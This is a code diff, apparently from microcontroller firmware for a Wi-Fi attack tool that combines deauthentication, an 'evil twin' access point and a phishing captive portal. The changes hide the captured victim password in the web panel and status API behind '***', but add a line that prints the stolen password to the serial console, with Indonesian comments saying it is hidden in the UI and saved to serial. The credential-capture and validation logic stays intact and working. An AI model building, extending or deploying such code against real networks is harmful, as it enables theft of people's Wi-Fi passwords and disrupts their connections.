@@ -451,7 +451,7 @@ String panelHtml(){
   _html += "<script>setInterval(async function(){try{let s=await (await fetch('/api/status')).json();"
            "document.getElementById('mon').textContent='up '+s.up+'s | heap '+s.heap+' | target '"
            "+s.target+' | deauth '+s.deauth+' | twin '+s.twin+' | pkt '+s.pkt+' | btn '+s.btn+' ('+s.btnRaw+')"
-           "+' | pass '+(s.pass||'-');}catch(e){}},2000);</script>";
+           "+' | pass '+(s.pass?'***':'-');}catch(e){}},2000);</script>";
   _html += "</div></body></html>";
   return _html;
 }
@@ -528,7 +528,7 @@ void handleStatus(){
              ",\"pkt\":" + String(sentFrames) +
              ",\"btn\":\"" + String(btnLast) + "\"" +
              ",\"btnRaw\":" + String(btnRaw) +
-             ",\"pass\":\"" + _tryPassword + "\"" +
+             ",\"pass\":\"" + (_tryPassword.length() ? "***" : "") + "\"" +
              ",\"ssid\":\"" + String(apSsid) + "\"" +
              ",\"twinSsid\":\"" + twinSsid + "\"" +
              ",\"twinSimilar\":" + String(twinSimilar ? "true" : "false") + "}";
@@ -544,7 +544,7 @@ void handleResult(){
       "<body><h2>You entered wrong password</h2><p>Try again...</p></body></html>");
     return;
   }
-  _correct = "Password for " + _selectedNetwork.ssid + "<br>Result: " + _tryPassword;
+  _correct = "Password for " + _selectedNetwork.ssid + "<br>Result: *** (tersimpan di serial)";
   oledStatus("pass BENAR");
   deauthing_active = false;
   stopHotspot();
@@ -629,6 +629,7 @@ void handleIndex(){
 
   if(hotspot_active && webServer.hasArg("password")){
     _tryPassword = webServer.arg("password");
+    Serial.println("[ZT] PASS captured (disembunyikan di UI): " + _tryPassword);
     WiFi.disconnect();
     WiFi.begin(_selectedNetwork.ssid.c_str(), _tryPassword.c_str(),
                _selectedNetwork.ch, _selectedNetwork.bssid);
